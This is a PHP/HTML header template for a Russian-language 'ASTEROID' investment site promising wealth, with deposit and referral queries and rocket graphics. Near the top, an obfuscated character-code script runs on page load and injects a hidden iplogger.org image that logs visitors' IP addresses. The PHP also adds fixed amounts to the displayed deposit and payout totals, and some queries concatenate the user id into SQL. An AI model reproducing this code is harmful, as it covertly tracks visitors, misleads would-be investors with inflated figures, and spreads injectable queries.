<?
if(!defined('SCRIPT_BY_SIRGOFFAN')){
exit();
}
?>
<html lang="RU">
	<head>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ASTEROID - ВАШ ПУТЬ К БОГАТСТВУ!</title>
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i|Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i" rel="stylesheet">
<link rel="stylesheet" href="/css/main.css">
<link rel="stylesheet" href="/css/pre.css">
<link rel="stylesheet" href="/css/reg.css">
<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
<link rel="shortcut icon" type="image/png" href="/favicon.png">
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!70!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
	<script>
		$(document).ready(function(){
			setInterval(function(){
				$('.countdown').each(function(){
					var time=$(this).text().split(':');
					var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
					var hours=Math.floor(timestamp/3600);
					var minutes=Math.floor((timestamp- hours*3600)/ 60);
					var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}
					
				if(minutes<10){minutes='0'+ minutes;}
				if(seconds<10){seconds='0'+ seconds;}
				if(timestamp>0){
				$(this).text(hours+':'+ minutes+':'+ seconds);
				}else{
				$(this).text('Выплачивается');	
				}
				});
		},1000);

		})
		</script>
<script type="text/javascript" src="http://gostats.ru/js/counter.js"></script>  
<script type="text/javascript">_gos='c4.gostats.ru';_goa=407459;
_got=5;_goi=1;_gol='анализ сайта';_GoStatsRun();</script>
<noscript><img alt="" 
src="http://c4.gostats.ru/bin/count/a_407459/t_5/i_1/counter.png" 
style="border-width:0" /></noscript>
	
</head>
<?
$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);
$refsprofit=$db->query("SELECT SUM(summa) as payed FROM deposits WHERE curatorid=?i",$id);
$refsprofit=$db->fetch($refsprofit);
$payed=$refsprofit['payed']*($refpercent/100);
$wallet=$db->getOne("SELECT wallet FROM ss_users WHERE id=?i",$id);
$refsprofit=$db->query("SELECT SUM(summa) as waited FROM deposits WHERE status=?i AND curatorid=?i",0,$id);
$refsprofit=$db->fetch($refsprofit);
$waited=$refsprofit['waited']*($refpercent/100);
$last_ip=$db->getOne("SELECT last_ip FROM ss_users WHERE id=?i",$id);
$reg_unix=$db->getOne("SELECT reg_unix FROM ss_users WHERE id=?i",$id);
$opened=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i",0));
$closed=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i",1));
$Users=$db->numRows($db->query("SELECT id FROM ss_users"));
$avatar=$db->getOne("SELECT avatar FROM ss_users WHERE id=?i",$id);
$closed=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i",1));
$AmountDeposits=$db->getOne("SELECT sum(summa) FROM `pay` WHERE type='Пополнение баланса'")+7000;
$PayDeposits=$db->getOne("SELECT sum(summa) FROM `pay` WHERE type!='Пополнение баланса'")+700;

$sql = $pdo->Query("SELECT SUM(summa) FROM `deposits` WHERE `status` = '1' and `userid`='".$id."'")->fetch();
$num1 = $sql['SUM(summa)'];

$sql = $pdo->Query("SELECT SUM(summa) FROM `deposits` WHERE `status` = '0' and `userid`='".$id."'")->fetch();
$num2 = $sql['SUM(summa)'];

$sql = $pdo->Query("SELECT SUM(summa) FROM `deposits` WHERE `status` = '1' and `userid`='".$id."'")->fetch();
$num4 = $sql['SUM(summa)'];

$sql = $pdo->Query("SELECT SUM(summa) FROM `deposits` WHERE `status` = '2' and `userid`='".$id."'")->fetch();
$num3 = $sql['SUM(summa)'];
?>		
	<body class="home page page-template page-template-template-home page-template-template-home-php our_process careers" style="overflow: hidden;">
<div id="preloader">
	<div class="loaderspinner">
		<div data-index='0' class="circle"></div>
		<div data-index='1' class="circle"></div>
		<div data-index='2' class="circle"></div>
		<div data-index='3' class="circle"></div>
		<div data-index='4' class="circle"></div>
		<div data-index='5' class="circle"></div>
		<div data-index='6' class="circle"></div>
		<div data-index='7' class="circle"></div>
		<div data-index='8' class="circle"></div>
		<div data-index='9' class="circle"></div>
		<div data-index='10' class="circle"></div>
	</div>
	<div id="stars"></div>
	<div id="stars2"></div>
	<div id="stars3"></div>
	<div id="preloader-launch">

		<svg version="1.1" class="digirocket" xmlns="http://www.w3.org/2000/svg" x="0" y="0" viewBox="0 0 205.9 268.5" xml:space="preserve"><g id="prerocket"><path class="st0" d="M102.8 234.7c-3.8 0-7.6.5-11.1 1.3 3.6.9 7.3 1.3 11.1 1.3s7.6-.5 11.2-1.4c-3.6-.8-7.4-1.2-11.2-1.2zM102.8 224.9c-13.7 0-27 1.6-39.8 4.5 12.8 3 26.1 4.5 39.8 4.5 13.7 0 27-1.6 39.8-4.5-12.8-3-26.1-4.5-39.8-4.5z"/><path class="st1" d="M102.8 221c-13.7 0-27 1.6-39.8 4.5 12.8 3 26.1 4.5 39.8 4.5 13.7 0 27-1.6 39.8-4.5-12.8-2.9-26.1-4.5-39.8-4.5z"/><path class="st2" d="M102.8 234.8c-3.8 0-7.6.5-11.1 1.3 3.6.9 7.3 1.3 11.1 1.3s7.6-.5 11.2-1.4c-3.6-.8-7.4-1.2-11.2-1.2z"/><path class="st3" d="M102.9 234c-3.8 0-7.5.5-11 1.3 3.5.9 7.2 1.3 11 1.3s7.5-.5 11-1.3c-3.5-.9-7.2-1.3-11-1.3z"/><linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="39.665" y1="58.863" x2="172.563" y2="170.378"><stop offset="0" stop-color="#ff6e7b"/><stop offset=".1" stop-color="#ff3043"/><stop offset=".338" stop-color="#df1f26"/><stop offset=".56" stop-color="#b21d26"/><stop offset=".847" stop-color="#9f1d26"/><stop offset="1" stop-color="#941d26"/></linearGradient><path class="st4" d="M176.9 165.2c2.7-11.2 4.2-22.9 4.2-35 0-17.5-3-34.3-8.6-49.9C160 45.8 135 17.1 103 0 70.9 17.1 45.9 45.8 33.5 80.4c-5.6 15.6-8.6 32.4-8.6 49.9 0 12.4 1.5 24.5 4.4 36 24-9 49.2-13.6 75.2-13.6 24.9-.1 49.2 4.2 72.4 12.5z"/><path class="st5" d="M103.1 235.4c3.7 0 7.3.3 10.9.7l8.4-15.3H83.2l8.5 15.4c3.7-.6 7.5-.8 11.4-.8z"/><linearGradient id="SVGID_2_" gradientUnits="userSpaceOnUse" x1="0" y1="220.886" x2="46.245" y2="220.886"><stop offset="0" stop-color="#ff6e7b"/><stop offset=".1" stop-color="#ff3043"/><stop offset=".338" stop-color="#df1f26"/><stop offset=".56" stop-color="#b92332"/><stop offset=".847" stop-color="#9c1e2a"/><stop offset="1" stop-color="#7d1922"/></linearGradient><path class="st6" d="M.8 173.2l-.8.4 40.2 95 .6-.2c-1.2-14.8.8-29.2 5.5-42.5-6.9-15-14.3-41.3-17.2-52.5-9.7 1.2-19.2 1.1-28.3-.2z"/><path class="st7" d="M31 173c-.6.1-1.2.2-1.7.3h-.2c3 11.2 10.3 37.5 17.2 52.5 1-2.9 2.2-5.8 3.4-8.5L31 173z"/><path class="st8" d="M31 173c-.6.1-1.2.2-1.7.3h-.2c3 11.2 10.3 37.5 17.2 52.5 1-2.9 2.2-5.8 3.4-8.5L31 173z"/><path class="st9" d="M176.7 173.3c-.6-.1-1.2-.2-1.7-.3l-18.7 44.2c1.3 2.9 2.5 5.9 3.6 9 7-14.9 14.4-41.5 17.4-52.8-.3-.1-.5-.1-.6-.1z"/><linearGradient id="SVGID_3_" gradientUnits="userSpaceOnUse" x1="212.353" y1="180.031" x2="144.6" y2="247.785"><stop offset="0" stop-color="#ff6e7b"/><stop offset=".1" stop-color="#ff3043"/><stop offset=".338" stop-color="#df1f26"/><stop offset=".56" stop-color="#b92332"/><stop offset=".847" stop-color="#9c1e2a"/><stop offset="1" stop-color="#7d1922"/></linearGradient><path class="st10" d="M205.1 173.2c-9 1.3-18.4 1.4-27.9.1-3 11.3-10.5 37.9-17.4 52.8 4.6 13.2 6.5 27.4 5.3 42.1l.6.2 40.2-95-.8-.2z"/><path class="st7" d="M176.7 173.3c-.6-.1-1.2-.2-1.7-.3l-18.7 44.2c1.3 2.9 2.5 5.9 3.6 9 7-14.9 14.4-41.5 17.4-52.8-.3-.1-.5-.1-.6-.1z"/><path class="st11" d="M176.7 173.3c-.6-.1-1.2-.2-1.7-.3l-18.7 44.2c1.3 2.9 2.5 5.9 3.6 9 7-14.9 14.4-41.5 17.4-52.8-.3-.1-.5-.1-.6-.1z"/><path class="st12" d="M104.5 154.4c24.8 0 49 4.2 72 12.5.1-.6.3-1.2.4-1.7-23.2-8.4-47.5-12.6-72.4-12.6-26 0-51.2 4.6-75.2 13.6.1.6.3 1.2.4 1.7 23.9-8.9 49-13.5 74.8-13.5z"/><path class="st13" d="M104.5 152.7c24.8 0 49.4 4.2 72.4 12.6.1-.6.3-1.2.4-1.7-23.2-8.4-47.9-12.6-72.9-12.6-26 0-51.6 4.6-75.6 13.6.1.6.3 1.2.4 1.7 23.9-9.1 49.5-13.6 75.3-13.6z"/><path class="st0" d="M103 224.9l.1 10.5s7.1.3 10.9.7l5.7-10.3c-.1-.1-9.5-.9-16.7-.9z"/><path class="st14" d="M74.8 79.5c.3-1.6.7-3.3 1.1-4.9 4.3-13.1 12.7-22.9 27.1-22.9 2.7 0 5.2.3 7.4.9-.1-1.5-.3-2.9-.5-4.4-2.2-.4-4.5-.6-7-.6-18 0-28.5 12.2-33.9 28.7-.5 2-.9 4.1-1.3 6.1 14.9 2.8 30 3.9 45.1 3.1-.1-1.2-.1-2.5-.2-3.7-12.6.9-25.3.1-37.8-2.3z"/><path class="st15" d="M172.3 80.4C159.9 45.8 134.9 17.1 102.8 0v1.5c2.8 15.4 5 31.1 6.7 46.9 14.8 2.9 22.6 14.9 27 28.3.5 1.9.9 3.9 1.3 5.8-8.4 1.6-16.9 2.6-25.4 3.1.5 10.4.8 20.9.8 31.5 0 12-.3 23.9-1 35.7 22.2.8 43.9 5 64.6 12.4 2.7-11.2 4.2-22.9 4.2-35-.1-17.5-3.1-34.2-8.7-49.8z"/><path class="st14" d="M136.9 76.6c-4.5-13.3-12.2-25.4-27-28.3.2 1.5.3 2.9.5 4.4 10.6 2.9 16.3 12.1 19.7 22.1.4 1.6.7 3.1 1 4.7-6.1 1.2-12.3 1.9-18.5 2.3.1 1.2.1 2.4.2 3.7 8.5-.4 17-1.5 25.4-3.1-.4-1.9-.8-3.8-1.3-5.8z"/><linearGradient id="SVGID_4_" gradientUnits="userSpaceOnUse" x1="106.861" y1="75.353" x2="130.046" y2="61.967"><stop offset=".537" stop-color="#ce202f"/><stop offset="1" stop-color="#d43d4a"/></linearGradient><path class="st16" d="M136.9 76.6c-4.5-13.3-12.2-25.4-27-28.3.2 1.5.3 2.9.5 4.4 10.6 2.9 16.3 12.1 19.7 22.1.4 1.6.7 3.1 1 4.7-6.1 1.2-12.3 1.9-18.5 2.3.1 1.2.1 2.4.2 3.7 8.5-.4 17-1.5 25.4-3.1-.4-1.9-.8-3.8-1.3-5.8z"/><linearGradient id="SVGID_5_" gradientUnits="userSpaceOnUse" x1="86.291" y1="57.651" x2="119.625" y2="90.985"><stop offset="0" stop-color="#cadae0"/><stop offset=".522" stop-color="#b3d7e0"/></linearGradient><path class="st17" d="M130 74.9c-3.4-10.1-9.1-19.2-19.7-22.1-2.2-.6-4.7-.9-7.4-.9-14.3 0-22.7 9.7-27.1 22.9-.4 1.6-.8 3.2-1.1 4.9 12.5 2.4 25.1 3.2 37.7 2.3 6.2-.4 12.4-1.2 18.5-2.3-.1-1.7-.5-3.3-.9-4.8z"/><path class="st15" d="M131.1 79.5c-.3-1.6-.6-3.1-1-4.7-3.4-10.1-9.1-19.2-19.7-22.1 6.2 7.4 5 20 2.2 29.1 6.2-.3 12.3-1.1 18.5-2.3z"/><path class="st18" d="M142.8 229.4c-8-1.9-16.2-3.2-24.5-3.9 8.3.7 16.5 2.1 24.5 3.9z"/><path class="st15" d="M112.4 154.5h.6c-.2.1-.4.1-.6 0z"/><linearGradient id="SVGID_6_" gradientUnits="userSpaceOnUse" x1="29.72" y1="191.904" x2="176.457" y2="191.904"><stop offset="0" stop-color="#52615f"/><stop offset=".653" stop-color="#424c4b"/><stop offset="1" stop-color="#353d3c"/></linearGradient><path class="st19" d="M118.8 154.9c-.3 0-.6 0-.9-.1-1-.1-2-.1-3-.2-.6 0-1.2-.1-1.8-.1h-.6c-2.6-.1-5.3-.2-8-.2-25.8 0-50.9 4.6-74.8 13.6 1.1 4.1 2.3 8.2 3.8 12.1 6.6 18.4 16.8 35.1 29.7 49.3 12.8-3 26.1-4.5 39.8-4.5h2.1c1.3 0 2.7 0 4 .1.7 0 1.4.1 2.1.1.8 0 1.7.1 2.5.1 1.4.1 2.8.2 4.3.3h.3c8.4.7 16.6 2 24.6 3.8 12.9-14.2 23-30.9 29.6-49.3 1.5-4.3 2.9-8.7 4-13.1-18.6-6.6-37.9-10.6-57.7-11.9z"/><path class="st15" d="M176.5 166.9c-18.6-6.7-37.8-10.8-57.6-12.1-.3 0-.6 0-.9-.1-1-.1-2-.1-3-.2-.6 0-1.2-.1-1.8-.1h-.6c-1.4 23.8-4 47.3-7.9 70.3h.5c1.3 0 2.7 0 4 .1.7 0 1.4.1 2.1.1.8 0 1.7.1 2.5.1 1.4.1 2.8.2 4.3.3h.3c8.4.7 16.6 2 24.6 3.8 12.9-14.2 23-30.9 29.6-49.3 1.4-4 2.7-8.4 3.9-12.9z"/><path class="st20" d="M79.3 77.2s6.7 1.1 8.3 1.1c0 0 .9-17.7 3.9-20.2 0 0-.7-1.1-2.9 1.1 0 .1-5.4 4.2-9.3 18z"/><circle class="st20" cx="96.2" cy="59.8" r="3.2"/><linearGradient id="SVGID_7_" gradientUnits="userSpaceOnUse" x1="28.449" y1="115.887" x2="97.741" y2="115.887"><stop offset="0" stop-color="#fff"/><stop offset="1" stop-color="#fff"/></linearGradient><path class="st21" d="M97.7 2.9s.3 9.4-14.5 25.2c0 0-28.6 29.7-32.5 68.9 0 0-5.4 15.9 0 47.4 0 0 7.6 56.4 22.3 73.7l6.3 8.1-13.9 2.7S41.5 202.6 35 174.6c0 0-8.4-29.1-6.2-46.7 0 0 .3-36.8 12.6-54.3.1-.1 12.5-29.1 56.3-70.7z"/><path class="st22" d="M87 226.2l4.8 9.1 1.3-.5-4.6-8.6c.1 0-.8-.4-1.5 0z"/><path class="st23" d="M119 226l-5.3 9.6-1.5-.3 6.1-9.3s.3-.2.7 0z"/><ellipse transform="rotate(-49.445 79.707 22.94)" class="st24" cx="79.7" cy="22.9" rx="8.7" ry=".9"/><path class="st25" d="M40.2 165.2s4.2-2.7 31.7-7.6"/><path class="st26" d="M129.4 156.9s28 3.6 44.8 10.5c0 0-6.5 29-27.3 54.7 0 0 19.9-37.5 19.8-48 0 0-9.9-9-37.3-17.2z"/><path class="st27" d="M120.2 150.3s23.9.1 55.6 11.1c0 0 9.8-33.8-4.3-78.3 0 0 4.4 42.8-4.1 63.6 0 0-5.6 3.6-47.2 3.6z"/><path class="st25" d="M36.2 167.2s4.2 19.8 16.1 38.9c0 0-15.2-33.3-12.2-39.9-.1 0-1.5.3-3.9 1z"/><path class="st28" d="M2.3 174.9s3.8 1.8 10.1 1.2c0 0-2.3 16.4 11.4 50.1"/><path class="st15" d="M121.7 79.1l7.7-.7s-2.4-9.4-4.9-12.9c0-.1 4.9 13.1-2.8 13.6z"/></g><linearGradient id="blast_1" gradientUnits="userSpaceOnUse" x1="103.139" y1="257.582" x2="103.139" y2="235.292"><stop offset="0" stop-color="#3dcaea" stop-opacity="0"/><stop offset="1" stop-color="#3dcaea" stop-opacity=".5"/></linearGradient><path id="blastit" class="st29" d="M93.8 235.9s7.3-1.4 18.6 0l1.8 21.6H92.1l1.7-21.6z"/><ellipse id="pulse03" class="st3" cx="103" cy="239.8" rx="7.1" ry="1.3"/><ellipse id="pulse02" class="st3" cx="103" cy="239.8" rx="7.1" ry="1.3"/><ellipse id="pulse01" class="st3" cx="103" cy="239.8" rx="7.1" ry="1.3"/></svg>
</div>
</div>
<?if(empty($id)){?>
<!-- HEADER -->
<header class="site-header">
	<div class="site-branding">
		<a class="logo" href="/">
			<svg id="dt-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1227.7 254"><style/><g id="digitech"></g><clipPath id="clip-the-d"><path class="clip-the-d" d="M147.5 308.2C17.9 308.2-87.2 203.1-87.2 73.4c0-4.1.1-8.2.3-12.3h-185.5v498h436.3V307.6c-5.4.4-10.9.6-16.4.6z"/></clipPath><path id="d-icon" class="shades" d="M184.9 36.2C160.4 12.9 126.1 0 88.4 0H0v254h88.4c37.7 0 72-13 96.6-36.6 24.3-23.3 37.7-55.4 37.7-90.4v-.7c0-34.9-13.4-66.9-37.8-90.1zm-3.2 91.5c0 38.3-21.2 67.9-54.7 80.6-1.1-1.1-2.6-1.7-4.3-1.7-2 0-3.7.9-4.8 2.4-1.9-4.3-6.2-7.3-11.2-7.3-6.7 0-12.2 5.4-12.3 12 0-.3-.1-.6-.1-1 0-4.9 2.9-9.2 7-11.2-4.5-7.2-12.3-12.2-21.3-13 4 5.3 6.5 11.9 6.5 19.1 0 2.6-.3 5-.9 7.4h-.4c.1-1.1.2-2.1.2-3.2 0-9-3.5-17.2-9.1-23.3l31.8-52.7-1.4-1-37.6 41c1.2 2.6 2 5.4 2.2 8.4-5.8-4.3-12.9-6.9-20.7-6.9-1.8 0-3.5.2-5.3.4 3-1 6.2-1.5 9.5-1.5 4.8 0 9.4 1.1 13.4 3-4.3-9.5-13.8-16.1-24.8-16.1h-.3c1.6-.3 3.2-.5 4.9-.5 1.5 0 3 .2 4.4.4-.9-5.6-5.7-9.8-11.6-9.8-1.4 0-2.8.3-4 .7 0 0 .1 0 .1-.1.4-.2.8-.5 1.2-.7.1-.1.2-.1.4-.2l1.5-.6c.8-.2 1.5-.4 2.4-.4-.3-1.3-1.2-2.4-2.3-3.1V39h48.1c27.7 0 51.3 9 68.4 25.9 16.1 15.9 24.9 38 24.9 62.1v.7z"/><clipPath id="clip-the-blast"><circle class="clip-the-blast shades" cx="119.6" cy="112.7" r="23.7"/></clipPath><path id="blast" class="shades" d="M205.8 190.9c-.2 0-.4-.1-.7-.1-2.1 0-3.9 1.6-4 3.7-2-1.4-4.4-2.2-7.1-2.2-5.2 0-9.6 3.2-11.5 7.8l-1.2-.9c-.3-.2-.7-.5-1.1-.7-.2-.1-.4-.2-.5-.3l-.6-.3-.6-.3c-.2-.1-.4-.2-.7-.3-.2-.1-.4-.1-.6-.2-.2-.1-.5-.2-.7-.2-.2-.1-.4-.1-.6-.2-.3-.1-.5-.1-.8-.2-.2 0-.4-.1-.5-.1-.3-.1-.6-.1-.9-.1-.2 0-.3 0-.5-.1-.5 0-.9-.1-1.4-.1-4.6 0-8.7 1.9-11.7 4.8-2.2-1.4-4.9-2.2-7.9-2.2-5.8 0-10.7 3.1-12.6 7.4-.2-.2-.5-.4-.8-.6-.1 0-.1-.1-.2-.1-.6-.4-1.2-.7-1.9-.9-.1 0-.1 0-.2-.1-.8-.3-1.7-.4-2.6-.4-3.1 0-5.8 1.6-7.2 3.8-1.1-1-2.5-1.6-4.2-1.6-2 0-3.7.9-4.8 2.4-1.9-4.3-6.2-7.3-11.2-7.3-6.7 0-12.2 5.4-12.3 12 0-.3-.1-.6-.1-1 0-4.9 2.9-9.2 7-11.2-4.5-7.2-12.3-12.2-21.3-13 4 5.3 6.5 11.9 6.5 19.1 0 2.6-.3 5-.9 7.4H85c.1-1.1.2-2.1.2-3.2 0-9-3.5-17.2-9.1-23.3l31.8-52.7-1.4-1-37.6 41c1.2 2.6 2 5.4 2.2 8.4-5.8-4.3-12.9-6.9-20.7-6.9-1.8 0-3.5.2-5.3.4 3-1 6.2-1.5 9.5-1.5 4.8 0 9.4 1.1 13.4 3-4.3-9.5-13.8-16.1-24.8-16.1h-.3c1.6-.3 3.2-.5 4.9-.5 1.5 0 3 .2 4.4.4-.9-5.6-5.7-9.8-11.6-9.8-1.4 0-2.8.3-4 .7 0 0 .1 0 .1-.1.4-.2.8-.5 1.2-.7.1-.1.2-.1.4-.2l1.5-.6c.8-.2 1.5-.4 2.4-.4-.3-1.1-1-2.1-1.9-2.8.8-1.1 1.3-2.5 1.3-3.9 0-1.7-.7-3.2-1.8-4.4-.3-.3-.6-.6-1-.9-.2-.1-.4-.3-.5-.4-.2-.1-.4-.2-.5-.3h-.1c-.2-.1-.3-.2-.5-.2h-.1c-.2-.1-.3-.1-.5-.2 0 0-.1 0-.1-.1-.2-.1-.3-.1-.5-.1h-.2c-.2 0-.5-.1-.7-.1v-.1c0-8.6-7-15.6-15.6-15.6-.9 0-1.8.1-2.6.2 1.7-2.2 2.6-4.9 2.6-7.9 0-7.3-5.9-13.2-13.2-13.2-.4 0-.8 0-1.1.1-.4 0-.9.1-1.3.2-.7-1.1-2-1.8-3.4-1.8-.3 0-.6 0-.9.1V254H88c30.7 0 59.2-8.6 82-24.6 1.2-.8 2.3-1.7 3.5-2.5.2-.2.4-.3.7-.5 1.2-.9 2.3-1.8 3.4-2.7 1.1-.9 2.1-1.8 3.2-2.7.3-.2.5-.5.8-.7 1-.9 2.1-1.9 3.1-2.9.8-.8 1.7-1.6 2.5-2.5l1.1-1.1.3-.3c6.8-6.8 12.5-14.4 17.2-22.6z"/><g id="rocket"><g id="spaceship"><path class="spaceship" d="M141.1 87.8c12.9 8.8 24 19.5 33 31.9.2-.1.3-.3.5-.4.3-.2.6-.5.8-.7 5-4.7 9.7-10 13.7-15.9 6.2-9.1 10.5-18.9 13.1-29 5.8-22.4 2.9-46.1-7.7-66.3h-.1C171.7 5 148.7 11.1 130 24.7c-8.4 6.1-15.9 13.8-22.1 22.9-4.2 6.1-7.5 12.6-10 19.2-.1.4-.3.7-.4 1.1-.1.2-.2.5-.3.7 15.7 3.5 30.4 10 43.9 19.2zM155 35.1c6.9-5.3 14.7-7.4 22.1-2.3 1.4 1 2.6 2 3.5 3.1 4.5 5.3 4.2 12 2.4 18.5-.4.9-.7 1.9-1.1 2.8-3.6-1.6-7.1-3.3-10.4-5.3-6.8-4-13.2-8.9-18.8-14.5.8-.9 1.5-1.6 2.3-2.3z"/><path class="spaceship" d="M186.4 133.4a60.7 60.7 0 0 1-14.5-9.8c-.1-.1-.2-.2-.3-.2-.3-.2-.5-.5-.8-.7.8-.7 1.7-1.4 2.5-2.1-9-12.4-20.1-23.1-32.9-31.8-13.4-9.1-28-15.6-43.6-19.3-.4 1.1-.8 2.3-1.1 3.4l.2-1c-.3-.2-.7-.3-1-.5 0 0-.1 0-.1-.1-5.5-2.7-10.4-6.1-14.7-10l-.5-.1L67 124.8l.4.1c4.6-8.1 10.7-14.9 17.8-20.2 1.6-1.1 3.2-2.2 4.8-3.2l2.2-11.2c-.7 7.4-.6 14.9.5 22.3h-.1c3.9 4.2 8.1 8.1 12.7 11.7l-.2 1.9c1.6 1.7 3.3 3.3 5.3 4.6 2 1.4 4.1 2.4 6.3 3.2 0 0 .1 0 .1.1l1.7-.9c5 2.9 10.2 5.4 15.5 7.4-1.4-1.5-2.8-2.9-4.3-4.3h.1c1.5 1.4 2.9 2.9 4.3 4.4l.1.1c6.7-1.6 13.3-4 19.6-7.1l-8.4 5.5c-.3 2-.8 4-1.3 5.9-2.3 8.5-6.3 16.6-12.1 23.8l.2.3 54.4-35.2-.2-.6zm-54.1 3.5c-.3-.1-.6-.3-.9-.4-.9-.4-1.8-.8-2.6-1.2-.3-.1-.5-.2-.8-.4-2.2-1-4.4-2.2-6.5-3.4l4-2c-2.9-2.5-6-4.9-9.3-7.1-3.3-2.2-6.6-4.2-10-6l-.4 4.5c-1.9-1.6-3.8-3.2-5.6-4.8l-.6-.6c-.7-.7-1.4-1.3-2.1-2l-.7-.7c-.9-.9-1.7-1.8-2.5-2.6 1 .4 2 .8 3.1 1.2.1.1.3.1.4.2l2.7 1.2c.1 0 .1.1.2.1 5.5 2.5 10.8 5.5 16 9 3.3 2.2 6.4 4.6 9.3 7.1 1.7 1.4 3.4 2.9 4.9 4.4.1 0 .1.1.2.1l2.1 2.1.3.3c.8.8 1.5 1.6 2.3 2.4-1.2-.4-2.3-.9-3.5-1.4z"/></g><path id="window" class="window" d="M155 35.1c6.9-5.3 14.7-7.4 22.1-2.3 1.4 1 2.6 2 3.5 3.1 4.5 5.3 4.2 12 2.4 18.5-.4.9-.7 1.9-1.1 2.8-3.6-1.6-7.1-3.3-10.4-5.3-6.8-4-13.2-8.9-18.8-14.5.8-.9 1.5-1.6 2.3-2.3z"/></g></svg>		</a>
	</div>

	<nav id="site-navigation" class="main-navigation" role="navigation">
		<ul id="menu-top-nav-1" class="nav">
<li class="menu-item menu-about"><a href="#dtposition4" class="careers container open-position">О проекте</a></li>
<li class="menu-item menu-investment"><a href="#dtposition2" class="careers container open-position">Правила</a></li>
<li class="menu-item menu-faq"><a href="#dtposition1" class="careers container open-position">FAQ</a></li>
<li class="menu-item menu-contact"><a href="#dtposition3" class="careers container open-position">Контакты</a></li>
<li class="menu-item menu-login"><a href="/auth"><b style="font-weight:600;">Войти в кабинет</b></a></li>
<li class="btn menu-item menu-start-a-project menu-create"><a href="/reg">Регистрация</a></li></ul>	
		
		<div id="mobilemenu" class="open">
			<div class="nav_bar">
			<ul id="menu-top-nav-1" class="nav">
			<li class="menu-item menu-about"><a href="#dtposition4" class="careers container open-position">О проекте</a></li>
<li class="menu-item menu-investment"><a href="/#dtposition2" class="careers container open-position">Правила</a></li>
<li class="menu-item menu-faq"><a href="#dtposition1" class="careers container open-position">FAQ</a></li>
<li class="menu-item menu-contact"><a href="#dtposition3" class="careers container open-position">Контакты</a></li>
<li class="menu-item menu-login"><a href="/auth"><b style="font-weight:600;">Войти в кабинет</b></a></li>
<li class="btn menu-item menu-start-a-project menu-create"><a href="/reg">Регистрация</a></li></ul></div>
		</div>
		<a id="hamburger" href="#" title="Menu">
			<span class="line line-1"></span>
			<span class="line line-2"></span>
			<span class="line line-3"></span>
		</a>
		<!-- Mobile Menu End -->
	</nav>
</header>
<? } else { ?>		
<header class="site-header">
	<div class="site-branding">
		<a class="logo" href="/">
			<svg id="dt-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1227.7 254"><style/><g id="digitech"></g><clipPath id="clip-the-d"><path class="clip-the-d" d="M147.5 308.2C17.9 308.2-87.2 203.1-87.2 73.4c0-4.1.1-8.2.3-12.3h-185.5v498h436.3V307.6c-5.4.4-10.9.6-16.4.6z"/></clipPath><path id="d-icon" class="shades" d="M184.9 36.2C160.4 12.9 126.1 0 88.4 0H0v254h88.4c37.7 0 72-13 96.6-36.6 24.3-23.3 37.7-55.4 37.7-90.4v-.7c0-34.9-13.4-66.9-37.8-90.1zm-3.2 91.5c0 38.3-21.2 67.9-54.7 80.6-1.1-1.1-2.6-1.7-4.3-1.7-2 0-3.7.9-4.8 2.4-1.9-4.3-6.2-7.3-11.2-7.3-6.7 0-12.2 5.4-12.3 12 0-.3-.1-.6-.1-1 0-4.9 2.9-9.2 7-11.2-4.5-7.2-12.3-12.2-21.3-13 4 5.3 6.5 11.9 6.5 19.1 0 2.6-.3 5-.9 7.4h-.4c.1-1.1.2-2.1.2-3.2 0-9-3.5-17.2-9.1-23.3l31.8-52.7-1.4-1-37.6 41c1.2 2.6 2 5.4 2.2 8.4-5.8-4.3-12.9-6.9-20.7-6.9-1.8 0-3.5.2-5.3.4 3-1 6.2-1.5 9.5-1.5 4.8 0 9.4 1.1 13.4 3-4.3-9.5-13.8-16.1-24.8-16.1h-.3c1.6-.3 3.2-.5 4.9-.5 1.5 0 3 .2 4.4.4-.9-5.6-5.7-9.8-11.6-9.8-1.4 0-2.8.3-4 .7 0 0 .1 0 .1-.1.4-.2.8-.5 1.2-.7.1-.1.2-.1.4-.2l1.5-.6c.8-.2 1.5-.4 2.4-.4-.3-1.3-1.2-2.4-2.3-3.1V39h48.1c27.7 0 51.3 9 68.4 25.9 16.1 15.9 24.9 38 24.9 62.1v.7z"/><clipPath id="clip-the-blast"><circle class="clip-the-blast shades" cx="119.6" cy="112.7" r="23.7"/></clipPath><path id="blast" class="shades" d="M205.8 190.9c-.2 0-.4-.1-.7-.1-2.1 0-3.9 1.6-4 3.7-2-1.4-4.4-2.2-7.1-2.2-5.2 0-9.6 3.2-11.5 7.8l-1.2-.9c-.3-.2-.7-.5-1.1-.7-.2-.1-.4-.2-.5-.3l-.6-.3-.6-.3c-.2-.1-.4-.2-.7-.3-.2-.1-.4-.1-.6-.2-.2-.1-.5-.2-.7-.2-.2-.1-.4-.1-.6-.2-.3-.1-.5-.1-.8-.2-.2 0-.4-.1-.5-.1-.3-.1-.6-.1-.9-.1-.2 0-.3 0-.5-.1-.5 0-.9-.1-1.4-.1-4.6 0-8.7 1.9-11.7 4.8-2.2-1.4-4.9-2.2-7.9-2.2-5.8 0-10.7 3.1-12.6 7.4-.2-.2-.5-.4-.8-.6-.1 0-.1-.1-.2-.1-.6-.4-1.2-.7-1.9-.9-.1 0-.1 0-.2-.1-.8-.3-1.7-.4-2.6-.4-3.1 0-5.8 1.6-7.2 3.8-1.1-1-2.5-1.6-4.2-1.6-2 0-3.7.9-4.8 